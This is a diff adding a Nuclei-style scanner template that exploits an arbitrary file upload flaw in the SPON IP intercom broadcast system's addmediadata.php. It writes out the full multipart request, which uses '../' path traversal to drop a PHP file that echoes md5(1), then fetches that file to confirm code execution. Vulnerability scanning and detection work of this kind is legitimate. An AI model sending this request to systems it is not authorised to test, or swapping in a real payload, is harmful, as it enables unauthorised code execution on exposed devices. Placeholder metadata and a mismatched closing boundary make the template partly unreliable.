@@ -1,0 +1,47 @@
+id: SPONIP-addmediadata-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 世邦通信 SPON IP网络对讲广播系统 addmediadata.php 任意文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+  
+variables:
+  filename: "{{rand_base(6)}}"
+  boundary: "{{rand_base(8)}}"
+http:
+  - raw:
+      - |-
+        POST /php/addmediadata.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16
+        Content-Length: 512
+        Content-Type: multipart/form-data; boundary=de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+        --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b{{boundary}}
+        Content-Disposition: form-data; name="fullpath"
+
+        ../
+        --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b{{boundary}}
+        Content-Disposition: form-data; name="subpath"
+
+        /
+        --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5(1);unlink(__FILE__);?>
+        --dde3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b{{boundary}}--
+      - |+
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
